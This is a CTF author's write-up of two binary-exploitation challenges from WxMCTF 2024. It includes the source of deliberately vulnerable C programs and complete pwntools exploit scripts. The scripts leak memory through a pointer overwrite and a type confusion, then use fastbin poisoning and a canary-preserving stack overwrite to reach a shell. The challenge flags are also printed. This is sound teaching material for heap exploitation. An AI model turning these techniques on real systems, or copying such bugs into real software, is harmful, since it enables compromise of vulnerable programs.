---
layout: post
title: "Challenges I Wrote For WxMCTF 2024"
date: 2024-03-31
categories: ctf pwn c
---

# Intro
Even though [WxMCTF 2024](https://ctftime.org/event/2179/) was a ctf competition made mostly by high schoolers for high schoolers, I was invited as a guest author by my friend ToadyTop to help them with creating some challenges.
What they didn't had was pwn4 and pwn5 (the second hardest and hardest pwn) so my assigned task was to create them.
In this post I will go over my thought process of designing the challenges and the solutions.
In short, pwn4 turned out to be pretty easy but educational and pwn5 was the hardest problem in the competition going by solves.

# pwn4 - leakleakleak
```
leakleakleak

description:
Leak, leak, leak, leak, I want you in my leak!

flag:
wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c}
```
If you didn't got it, the challenge name is a reference to the song [Boom, Boom, Boom](https://www.youtube.com/watch?v=llyiQ4I-mcQ) (maybe next year I should create a nightcore version, heh). At the beginning I thought the chall will be a little too easy but at the end it fitted nicely between pwn3 and pwn5 collecting 17 solves. The problem included the source code - binary exploitation problems ain't reversing problems, IMO most of the time they should include the source code but I'm going off-topic. If you want to try it out for yourself, there's the source code:
```c
// compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

char flag[128] = {0};

typedef struct {
    char username[32];
    char *description;
} User;

void warmup_heap(void) {
    void *addrs[3];
    for (size_t i = 0; i < 3; ++i) {
        addrs[i] = malloc(9000);
    }

    free(addrs[1]);
}

User *create_user(void) {
    User *user = calloc(1, sizeof (User));
    user->description = calloc(1, 256);
    return user;
}

void destroy_user(User *user) {
    free(user->description);
    free(user);
}

void init(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void read_flag(void) {
    int flag_fd = open("./flag.txt", O_RDONLY);
    off_t flag_size = lseek(flag_fd, 0, SEEK_END);
    lseek(flag_fd, 0, SEEK_SET);
    read(flag_fd, flag, flag_size);
    flag[flag_size] = '\00';
    close(flag_fd);
}

int main() {
    init();
    read_flag();
    warmup_heap();

    User *user = create_user();

    for (_Bool quit = 0; !quit; ) {
        printf("What is your name? ");
        read(STDIN_FILENO, user, sizeof(*user));
        printf("Hello %s!\n", user->username);
            
        puts("Let me tell you something about yourself! :3");
        printf("%s\n", user->description);
        
        printf("Continue? (Y/n) ");
        char c = getchar();
        if (c == 'n' || c == 'N')
            quit = 1;
    }

    puts("Boom! Boom, boom, boom! I want YOU in my room!");
    
    destroy_user(user);
    return 0;
}
```

There's the Dockerfile:
```dockerfile
FROM pwn.red/jail

COPY --from=ubuntu:22.04 / /srv

RUN mkdir /srv/app
COPY flag.txt /srv/app/flag.txt
COPY leakleakleak /srv/app/run
```

And there's the [included binary](/files/leakleakleak).

## The Idea
So the idea behind the chall is to teach people how to find chains of addresses.
For example we can always expect that on the stack there are other stack addresses, our binary addresses and libc addresses.
We can always expect there's a stack address in libc (`__environ`).
However a libc address is on the heap only if some conditions are satisfied.
In this case, [ptmalloc](https://sourceware.org/glibc/wiki/MallocInternals) stores chunks that belong to unsorted, large and small bins as a circular doubly-linked list that starts and ends in libc.
So to visualize this idea, we can make a directed graph.
Green arrows mean it's very likely there's a pointer from one to the other, yellow means that maybe there's a pointer and a red arrow means that a pointer like that is unlikely.
Of course im drawing this from a perspective of a smaller binary, in the case of huge binaries I'm sure there are pointers to everything sprinkled all over the place.
BEHOLD...
![Image](/files/leakdiagram.png)

To elaborate on some choices:
- The red arrows are there cuz it would be weird if we stored a stack address for example as a global variable inside of a binary - that's probably a bug.
- The heap has a lot of yellow arrows as the heap is pretty much almost zeroed. We need to do stuff with it so stuff can show up there.

## The Solution
So the intended solution was to:
- leak a heap address from the stack,
- leak a libc address from the heap,
- leak a stack address from libc,
- leak the binary address from libc,
- leak the flag from the binary.

It could be solved in a shorter by one step way by finding a binary address inside of libc instead of using the stack for it but honestly I wasn't aware of this while writing the challenge.
To find the addresses in a GDB session you can dump a bunch of memory and search for the addresses by hand.
GDB plugins like pwndbg or gef have special commands for finding addresses. I use pwndbg so I'll show you how to find them there.
A naive solution would be to try to dump a bunch of pointers with the `telescope` command and hope for a lucky find.
![Image](/files/telescopeleak.png)

However we can do better than that. In pwndbg we can use the `probeleak` command to find what we want for us. In the past I saw someone using GEF and honestly the command equivalent there felt more ergonomic but both can do the same thing.
![Image](/files/probeleakleak.png)

In the end, there's the `solve.py` (if you're confused by the `_patched` in the exe name, it's cuz I use [pwninit](https://github.com/io12/pwninit) but removing it also works):
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./leakleakleak_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['alacritty', '-e']


def conn():
    if args.REMOTE:
        io = remote("0.0.0.0", 5000)
    else:
        if args.GDB:
            io = gdb.debug([exe.path])
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()

    io.sendline(b'A' * 32)
    io.recvuntil(b'Hello ')
    io.recvuntil(b'\n')
    heap_leak = (b'\x00' + io.recvuntil(b'!\n')[:-2]).ljust(8, b'\x00')
    heap_leak = u64(heap_leak)
    info(f'heap leak: {hex(heap_leak)}')

    libc_addr = heap_leak + 0x110
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(libc_addr))
    io.recvuntil(b':3\n')
    libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'libc leak: {hex(libc_leak)}')

    libc.address = libc_leak - 2208601

    stack_addr = libc.symbols['__environ']
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(stack_addr))
    io.recvuntil(b':3\n')
    stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'stack leak: {hex(stack_leak)}')

    bin_addr = stack_leak - 0x150
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(bin_addr))
    io.recvuntil(b':3\n')
    bin_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'bin leak: {hex(bin_leak)}')

    flag_addr = bin_leak + 0x2d1e + 36
    info(f'flag addr: {hex(flag_addr)}')
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(flag_addr))
    io.recvuntil(b':3\n')

    io.interactive()


if __name__ == "__main__":
    main()
```

# pwn5 - Lain-writes-in-lisp
```
Lain-writes-in-lisp

description:
Have you read your SICP today?

flag:
wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!}
```

This time the challenge name is a reference to the cult classic anime [Serial Experiments Lain](https://anilist.co/anime/339/serial-experiments-lain).
And the title is not a drill! We can actually see the main protagonist Lain learning the C programming language at school while [using Common Lisp at home](https://www.reddit.com/r/Lain/comments/wb410b/is_this_real_code_and_if_yes_in_which_language/).
![Image](https://preview.redd.it/is-this-real-code-and-if-yes-in-which-language-found-it-in-v0-8aved1q18ie91.jpg?width=1080&crop=smart&auto=webp&s=68127b0a2779378c5c33a1ba9184b95107d05d26)

Overall the challenge got solved 2 times so I'm happy about that.

## The Idea
So the challenge is a [lisp-like](https://en.wikipedia.org/wiki/Lisp_(programming_language)) expression evaluator. This is how we interact with the program:
```
poni@tsukihime ~/w/w/pwn5 (main)> ./lain
                  .=.
                  '='
                  ___
       .**.   .*MWWWWWM*.   .**.
     .MWv"' *MWW'"""""'WWM* '"vWM.
   .MW"´  .WW.´         `.WW.  `"WM.
 .MW"     MW/   .*MWM*.   \WM     "MW.
 MW:     .WW    MWWWWWM    WW.     :WM
 WW*     'WM    WWWWWWW    MW'     *MW
  "WM.    WW\   "*WWW*"   /WW    .MW"
    ':W*. 'WWM.         .MWW' .*W:'
  .=. `"WW `*WWWv.   .vWWW*´ WW"´ .=.
  '='        `"*WW   WW*"´        '='
                WW   WW
                WW   WW
        oM.    ,WW   WW.    .Mo
        `*WM*-*WW'   'WW*-*MW*´
           `"-"´       `"-"´

CoplandOS <<< (+ 2 (* 3 3))
11
CoplandOS <<< (+ "hello" " " "world!")
hello world!
CoplandOS <<<
```

The idea for the solution is that I wanted to create heap challenge that is different that most of your typical note taking programs.
If you ever tried solving heap exploitation challenges I'm sure you came across those.
They tend to be popular because they are easy to make, don't require much creativity and most of the time easy to solve while introducing an idea.
In essence, the exploit is a basic heap one, however the bug is a little more subtle and the [heap feng shui](https://en.wikipedia.org/wiki/Heap_feng_shui) is harder to control, as with every expression there's a lot of allocations involved, mixing up `malloc`s, `free`s and `calloc`s. As a footnote: if you didn't know, calling `calloc` isn't the same as calling `malloc` + `memset`. By comparing both functions' source code we can see for example that `calloc` avoids anything related to tcache inside of ptmalloc. If I had to make an educated guess it's because the glibc authors try to avoid zeroing memory as much as possible. In addition to the standard security mitigations like PIE, NX and stack canaries, I also enabled full RELRO. Really for not a particular reason, it doesn't make the chall harder, it's just to show that we are getting serious. ;)
To get to the specifics the program works like a typical process of interpreting a programming language would look like.
First we [split our string into tokens](https://en.wikipedia.org/wiki/Lexical_analysis#Tokenization).
Then we transform the tokens into an [abstract syntax tree](https://en.wikipedia.org/wiki/Abstract_syntax_tree) with a [recursive descent parser](https://en.wikipedia.org/wiki/Recursive_descent_parser).
And at the end we go through all the tree nodes interpreting them in the way.
In a drawing the process would look like this:
![Image](/files/evalstages.png)

Actually I've learned all of this by reading [Crafting Interpreters](https://craftinginterpreters.com/) in the past, which is a great, great book.
Overall, this is the source code I ended up with:
```c
#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#define MAX_TOKEN_SIZE 1024
#define next(token) (*(token) = (*(token))->next)

typedef struct token {
  char *str;
  struct token *next;
} Token;

typedef enum { none, number, string, function } Type;

typedef struct number {
  int64_t value;
} Number;

typedef struct string {
  char *str_ptr;
  size_t str_len;
} String;

typedef struct function {
  char *function_name;
} Function;

typedef struct node {
  Type type;
  struct node *child_nodes;
  struct node *next;
  union {
    Number number;
    String string;
    Function func;
  } value;
} Node;

// Cool ascii art from:
// https://github.com/jreeee/dotfiles/blob/master/misc/lain-solid
char logo[] = ""
  "                  .=.\n"
  "                  '='\n"
  "                  ___\n"
  "       .**.   .*MWWWWWM*.   .**.\n"
  "     .MWv\"' *MWW'\"\"\"\"\"'WWM* '\"vWM.\n"
  "   .MW\"´  .WW.´         `.WW.  `\"WM.\n"
  " .MW\"     MW/   .*MWM*.   \\WM     \"MW.\n"
  " MW:     .WW    MWWWWWM    WW.     :WM\n"
  " WW*     'WM    WWWWWWW    MW'     *MW\n"
  "  \"WM.    WW\\   \"*WWW*\"   /WW    .MW\"\n"
  "    ':W*. 'WWM.         .MWW' .*W:'\n"
  "  .=. `\"WW `*WWWv.   .vWWW*´ WW\"´ .=.\n"
  "  '='        `\"*WW   WW*\"´        '='\n"
  "                WW   WW\n"
  "                WW   WW     \n"
  "        oM.    ,WW   WW.    .Mo\n"
  "        `*WM*-*WW'   'WW*-*MW*´\n"
  "           `\"-\"´       `\"-\"´   \n";

_Bool panic = false;

void boot_os(void);
void add_token(const char *token_str, size_t token_len, Token **beg, Token **end);
void destroy_tokens(Token *token);
Token *tokenize(const char *s, size_t len);
Node *create_node(void);
void destroy_nodes(Node *node);
_Bool is_number(const char *s);
char *get_string_literal(char *s, size_t *ret_len);
char *get_function_by_name(char *s);
Node *parse_token(Token **token);
Node *parse_expr(Token **token);
Node *eval_function(Node *node);
Node *eval(Node *node);
Node *plus_fnc(Node *args);
Node *mul_fnc(Node *args);
Node *none_fnc(Node *args);
void print_node(Node *args);
int main();

void boot_os(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  puts(logo);
}

void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) {
  Token *new_token = calloc(1, sizeof (Token));
  if (new_token == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  new_token->next = NULL;
  new_token->str = calloc(1, strlen(token_str) + 1);
  if (new_token->str == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  memcpy(new_token->str, token_str, token_len);
  if (*beg == NULL) {
    *beg = new_token;
    *end = new_token;
  } else {
    (*end)->next = new_token;
    *end = new_token;
  }
}

void destroy_tokens(Token *token) {
  if (token == NULL)
    return;
  destroy_tokens(token->next);
  free(token->str);
  free(token);
}

Token *tokenize(const char *s, size_t len) {
  char token_str[MAX_TOKEN_SIZE + 1];
  size_t token_length = 0;
  Token *beg = NULL;
  Token *end = NULL;
  _Bool inside_string = false;
  for (size_t i = 0; i < len; ++i) {
    char c = s[i];
    if ((c == ' ' || c == '\n' || c == '(' || c == ')') && !inside_string) {
      if (token_length != 0) {
        token_str[token_length] = '\0';
        add_token(token_str, token_length, &beg, &end);
        token_length = 0;
      }
      if (c == '(') {
        add_token("(", 1, &beg, &end);
      } else if (c == ')') {
        add_token(")", 1, &beg, &end);
      }
    } else if (token_length <= MAX_TOKEN_SIZE) {
      token_str[token_length++] = c;
    } else {
      panic = true;
      fprintf(stderr, "Token too long! Aborting...\n");
      return beg;
    }

    if (c == '"') {
      if (inside_string) {
        token_str[token_length] = '\0';
        add_token(token_str, token_length, &beg, &end);
        token_length = 0;
      }
      inside_string = !inside_string;
    }
  }

  return beg;
}

Node *create_node(void) {
  Node *node = malloc(sizeof (Node));
  if (node == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  node->child_nodes = NULL;
  node->next = NULL;
  node->type = none;
  return node;
}

void destroy_nodes(Node *node) {
  if (node == NULL)
    return;
  if (node->child_nodes != NULL)
    destroy_nodes(node->child_nodes);
  if (node->next != NULL)
    destroy_nodes(node->next);
  if (node->type == string)
    free(node->value.string.str_ptr);
  free(node);
}

_Bool is_number(const char *s) {
  while (*s)
    if (!isdigit(*s++))
      return false;
  return true;
}

char *get_string_literal(char *s, size_t *ret_len) {
  if (s == NULL)
    return NULL;
  if (*s != '"') 
    return NULL;
  size_t len = 1;
  while (s[len] != '"')
    ++len;
  char *new_s = calloc(1, len+1);
  memcpy(new_s, s+1, len-1);
  new_s[len] = '\0';
  *ret_len = len-1;
  return new_s;
}

char *get_function_by_name(char *s) {
  if (strcmp(s, "+") == 0) {
    return "+";
  } else if (strcmp(s, "*") == 0) {
    return "*";
  } else {
    return NULL;
  }
}

Node *parse_token(Token **token) {
  Node *node = create_node();
  char *str = NULL;
  size_t len;
  if (is_number((*token)->str)) {
    node->type = number;
    node->value.number.value = strtoll((*token)->str, NULL, 10);
  } else if ((str = get_string_literal((*token)->str, &len))) {
    node->type = string;
    node->value.string.str_ptr = str;
    node->value.string.str_len = strlen(str);
  } else {
    node->type = function;
    char *function_name = (*token)->str;
    node->value.func.function_name = get_function_by_name(function_name);
  }
  next(token);
  return node;
}

Node *parse_expr(Token **token) {
  if (token == NULL) {
    panic = true;
    return NULL;
  }
  
  Node *node = NULL;
  if (strcmp((*token)->str, "(") == 0) {
    next(token);
    node = parse_expr(token);
    if (node == NULL || node->type != function) {
      panic = true;
      return NULL;
    }
    while (strcmp((*token)->str, ")")) {
      Node *child_node = parse_expr(token);
      child_node->next = node->child_nodes;
      node->child_nodes = child_node;
    }
    next(token);
  } else if (strcmp((*token)->str, ")") == 0) {
    panic = true;
    return NULL;
  } else {
    node = parse_token(token);
  }

  return node;
}

Node *plus_fnc(Node *args) {
  Node *node = create_node();
  
  if (args->type == number) {
    node->type = number;
    node->value.number.value = 0;
    while (args != NULL) {
      node->value.number.value += args->value.number.value;
      args = args->next;
    }
  } else if (args->type == string) {
    node->type = string;
    size_t new_size = 1;
    for (Node *arg = args; arg != NULL; arg = arg->next)
      new_size += strlen(arg->value.string.str_ptr);
    char *new_str = calloc(1, new_size);
    if (new_str == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    size_t offset = 0;
    for (Node *arg = args; arg != NULL; arg = arg->next) {
      size_t arg_len = arg->value.string.str_len;
      memcpy(new_str+offset, arg->value.string.str_ptr, arg_len);
      offset += arg_len;
    }
    node->value.string.str_ptr = new_str;
    node->value.string.str_len = new_size;
  }
  
  return node;
}

Node *mul_fnc(Node *args) {
  Node *node = create_node();
  
  node->type = number;
  node->value.number.value = 1;
  while (args != NULL) {
    node->value.number.value *= args->value.number.value;
    args = args->next;
  }

  return node;
}

Node *none_fnc(Node *args) {
  Node *ret = create_node();
  ret->type = none;
  return ret;
}

Node *eval_function(Node *node) {
  Node *args = NULL;
  for (Node *child_node = node->child_nodes;
       child_node != NULL;
       child_node = child_node->next) {
    Node *evaled_node = eval(child_node);
    evaled_node->next = args;
    args = evaled_node;
  }

  char *function_name = node->value.func.function_name;
  Node *ret_node = NULL;
  if (function_name == NULL) {
    ret_node = none_fnc(args);
  } else if (strcmp(function_name, "+") == 0) {
    ret_node = plus_fnc(args);
  } else if (strcmp(function_name, "*") == 0) {
    ret_node = mul_fnc(args);
  } else {
    ret_node = none_fnc(args);
  }
  
  destroy_nodes(args);
  return ret_node;
}

Node *eval(Node *node) {
  Node *ret_node = NULL;
  switch (node->type) {
  case number:
    ret_node = create_node();
    ret_node->type = number;
    ret_node->value.number = node->value.number;
    break;
  case string:
    ret_node = create_node();
    ret_node->type = string;
    ret_node->value.string.str_len = node->value.string.str_len;
    char *str_cpy = malloc(node->value.string.str_len+1);
    if (str_cpy == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    memcpy(str_cpy, node->value.string.str_ptr, node->value.string.str_len+1);
    ret_node->value.string.str_ptr = str_cpy;
    break;
  case function:
    ret_node = eval_function(node);
    break;
  default:
    break;
  }
  return ret_node;
}

void print_node(Node *args) {
  for (Node *node = args; node != NULL; node = node->next) {
    switch (node->type) {
    case number:
      printf("%ld ", node->value.number.value);
      break;
    case string:
      printf("%s ", node->value.string.str_ptr);
      break;
    default:
      break;
    }
  }
  puts("");
}

void you_should_be_able_to_solve_this(void) {
  // :-)
  system("/bin/sh");
}

int main() {
  boot_os();
  _Bool quit = false;
  while (!quit) {
    char line[10000+1];
    size_t line_len = 0;
    Token *root_token = NULL;
    Node *ast = NULL;
    Node *final = NULL;
    
    printf("CoplandOS <<< ");

    line_len = read(STDIN_FILENO, line, 10000);
    line[line_len] = 0;
    if (strncmp(line, "quit", 4) == 0) {
      quit = true;
      goto cleanup;
    }
    
    root_token = tokenize(line, line_len);
    if (panic)
      goto cleanup;
    Token *tokens = root_token;
    ast = parse_expr(&tokens);
    if (panic)
      goto cleanup;
    final = eval(ast);
    if (panic)
      goto cleanup;
    print_node(final);

  cleanup:
    panic = false;
    destroy_nodes(final);
    destroy_nodes(ast);
    destroy_tokens(root_token);
  }
  
  return 0;
}
```

Close to the end you can see a `you_should_be_able_to_solve_this(void)` function that calls `/bin/sh`. In reality it doesn't make the chall easier in any way, I included it to be a little cheeky.
This is the Dockerfile:
```dockerfile
FROM ubuntu@sha256:81bba8d1dde7fc1883b6e95cd46d6c9f4874374f2b360c8db82620b33f6b5ca1 AS app

FROM pwn.red/jail
COPY --from=app / /srv
COPY lain /srv/app/run
COPY flag.txt /srv/app/flag.txt
```

And [this is the binary](/files/lain).

## The Solution
I won't be explaining in detail how a heap exploit works. There is an [infinite](https://github.com/shellphish/how2heap) [amount](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) [of](https://heap-exploitation.dhavalkapil.com/) [good](https://youtu.be/coAJ4KyrWmY?list=PL-ymxv0nOtqr4OchXR2rV_WNhpj4ccPq1) [enough](https://www.youtube.com/watch?v=HPDBOhiKaD8) [resources](http://phrack.org/issues/66/10.html) [about](https://www.udemy.com/course/linux-heap-exploitation-part-1/) [it](https://tukan.farm/2016/07/26/ptmalloc-fanzine/) that realistically I can't compete with them a blogpost like this.
Instead I will focus on the challenge itself.
First things first, I'm getting some leaks to break the ASLR. The challenge works on both strings and integers but there's a very simple type confusion thanks to that. The code checking the operands' types checks only the first one and assumes the rest is the same.
```c
Node *plus_fnc(Node *args) {
  Node *node = create_node();
  
  if (args->type == number) {
    node->type = number;
    node->value.number.value = 0;
    while (args != NULL) {
      node->value.number.value += args->value.number.value;
      args = args->next;
    }
  } else if (args->type == string) {
    node->type = string;
    size_t new_size = 1;
    for (Node *arg = args; arg != NULL; arg = arg->next)
      new_size += strlen(arg->value.string.str_ptr);
    char *new_str = calloc(1, new_size);
    if (new_str == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    size_t offset = 0;
    for (Node *arg = args; arg != NULL; arg = arg->next) {
      size_t arg_len = arg->value.string.str_len;
      memcpy(new_str+offset, arg->value.string.str_ptr, arg_len);
      offset += arg_len;
    }
    node->value.string.str_ptr = new_str;
    node->value.string.str_len = new_size;
  }
  
  return node;
}
```
This leads to two ways of getting leaks.
First we're adding a number to a string. In effect we're treating a string pointer as a number, getting a heap leak.
```python
io.sendlineafter(b"<<< ", b'(+ 0 "AABB")')
heap_leak = int(io.recvline())
info(f"heap_leak: {hex(heap_leak)}")
```

Another another way to get an arbitrary leak is to add a string to a number. The number will be treated as a string allowing us to leak whatever we want in the memory space.
```python
# Do a bunch of random allocations so there are libc addresses on the heap.
for i in range(20):
    payload = f'"{"C" * 200}" '
    payload = f'(+ {payload * 3} "A")'
    io.sendlineafter(b"<<< ", payload.encode())

# This is done so the string sizes are overwritten for leaking after this.
# Because we're using malloc to allocate memory for the nodes and the memory
# isn't cleared, we're inheriting them from the previous ones.
io.sendlineafter(b"<<< ", f'(+ "@@@@@@@@" "@@@@@@@@" "@@@@@@@@")'.encode())

# Get all the leaks.
io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+3416})'.encode())
io.recv(1)
libc_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")
libc.address = libc_leak - 2206944

io.sendlineafter(b"<<< ", f'(+ "@" {libc.sym["__environ"]})'.encode())
io.recv(1)
stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"stack_leak: {hex(stack_leak)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-144+1})'.encode())
io.recv(1)
stack_canary = u64(io.recv(7).rjust(8, b"\x00"))
info(f"stack_canary: {hex(stack_canary)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-112})'.encode())
io.recv(1)
bin_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"bin_leak: {hex(bin_leak)}")
exe.address=bin_leak-19776

io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+7208})'.encode())
io.recv(1)
heap_key = u64(io.recv(8).ljust(8, b"\x00"))
info(f"heap_key: {hex(heap_key)}")
```

Now, after we get our leaks we can think of a strategy for our buffer overflow.
We are getting the input with a `read` function, thanks to this we can have NULL bytes in our input string.
Later in the `add_token` function we're mixing up the size returned by calling `read` with length returned by `strlen`.
The function `strlen` stops when it encounters a NULL byte so we can abuse this to confuse the size inside of `calloc` to return a smaller allocation than it should.
```c
void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) {
  Token *new_token = calloc(1, sizeof (Token));
  if (new_token == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  new_token->next = NULL;
  new_token->str = calloc(1, strlen(token_str) + 1);
  if (new_token->str == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  memcpy(new_token->str, token_str, token_len);
```

From this point we can proceed in infinite number of ways since we're getting an almost arbitrarly long heap buffer overflow.
The two most obvious methods would be to either abuse fastbins or tcache.
Fastbins are a little more constrained that tcache in modern glibc, however in this challenge `calloc`s happen earlier than `malloc`s
so I found it easier to reason about while developing the exploit for my challenge. An another player in the ctf solved it with tcache poisoning
but I can't link their solution since they posted it only on the competition's Discord server.
So first we corrupt the heap's metadata so it later returns a chunk inside of the stack allowing us to overwrite the return address.
```python
# Corrupt 0x20 fastbins inside of the heap so fwd ptr points to the stack.
stack_xor = (stack_leak-10392-16) >> 12
payload = b"##\x00" + p64(0)*2 + p64(0x21) + \
    p64((stack_leak-10392-16)^heap_leak>>12)
io.sendlineafter(b"<<< ", b'"BEG ' + payload + b'"')
```

But that's not all. There's an additional check ptmalloc performs while returning a fastbin chunk, more specifically [it checks if the chunk size isn't corrupted](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks).
To satisfy this check I'm gonna spray the stack with the correct size at the place where I wanted the chunk to be.
When calculating offsets I specifically put the corrupted fwd ptr there, in a place where our input string is read into so I have control of what's in there.
```python
# Spray the stack with p64(0x21) values so ptmalloc wont complain about
# corrupted size. The overwritten fastbin points to a place on the stack
# where there are the 0x21 values.
io.sendlineafter(b"<<< ", b'"aaabbbb' + p64(0x21) * (1000) + b'"')
```

And as the final step I'm allocating a string that will be put on the stack, giving us a juicy stack corruption.
```python
# Corrupt the stack. yay!
io.sendlineafter(b"<<< ", b'"AAAA" "AAAA\x00BB' + p64(stack_canary) * 2 + \
                 p64(exe.sym['you_should_be_able_to_solve_this']+1) + b'"')
```

To wrap things up, this is the full exploit:
```python
from pwn import *

libc = ELF("./libc.so.6")
exe = ELF("./lain_patched")

context.terminal = "alacritty -e".split()
if args.REMOTE:
    io = remote("795db1b.678470.xyz", 32457)
    #io = remote("0.0.0.0", 5000)
elif args.GDB:
    io = gdb.debug("./lain_patched", aslr=False)
else:
    io = process("./lain_patched", aslr=False)
    #attach(io)

io.sendlineafter(b"<<< ", b'(+ 0 "AABB")')
heap_leak = int(io.recvline())
info(f"heap_leak: {hex(heap_leak)}")

# Do a bunch of random allocations so there are libc addresses on the heap.
for i in range(20):
    payload = f'"{"C" * 200}" '
    payload = f'(+ {payload * 3} "A")'
    io.sendlineafter(b"<<< ", payload.encode())

# This is done so the string sizes are overwritten for leaking after this.
io.sendlineafter(b"<<< ", f'(+ "@@@@@@@@" "@@@@@@@@" "@@@@@@@@")'.encode())

# Get all the leaks.
io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+3416})'.encode())
io.recv(1)
libc_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")
libc.address = libc_leak - 2206944

io.sendlineafter(b"<<< ", f'(+ "@" {libc.sym["__environ"]})'.encode())
io.recv(1)
stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"stack_leak: {hex(stack_leak)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-144+1})'.encode())
io.recv(1)
stack_canary = u64(io.recv(7).rjust(8, b"\x00"))
info(f"stack_canary: {hex(stack_canary)}")

io.sendlineafter(b"<<< ", f'(+ "@" {stack_leak-112})'.encode())
io.recv(1)
bin_leak = u64(io.recv(6).ljust(8, b"\x00"))
info(f"bin_leak: {hex(bin_leak)}")
exe.address=bin_leak-19776

io.sendlineafter(b"<<< ", f'(+ "@" {heap_leak+7208})'.encode())
io.recv(1)
heap_key = u64(io.recv(8).ljust(8, b"\x00"))
info(f"heap_key: {hex(heap_key)}")

# Corrupt 0x20 fastbins inside of the heap so fwd ptr points to the stack.
stack_xor = (stack_leak-10392-16) >> 12
payload = b"##\x00" + p64(0)*2 + p64(0x21) + \
    p64((stack_leak-10392-16)^heap_leak>>12)
io.sendlineafter(b"<<< ", b'"BEG ' + payload + b'"')

# Spray the stack with p64(0x21) values so ptmalloc wont complain about
# corrupted size. The overwritten fastbin points to a place on the stack
# where there are the 0x21 values.
io.sendlineafter(b"<<< ", b'"aaabbbb' + p64(0x21) * (1000) + b'"')
# Corrupt the stack. yay!
io.sendlineafter(b"<<< ", b'"AAAA" "AAAA\x00BB' + p64(stack_canary) * 2 + \
                 p64(exe.sym['you_should_be_able_to_solve_this']+1) + b'"')

io.interactive()
```
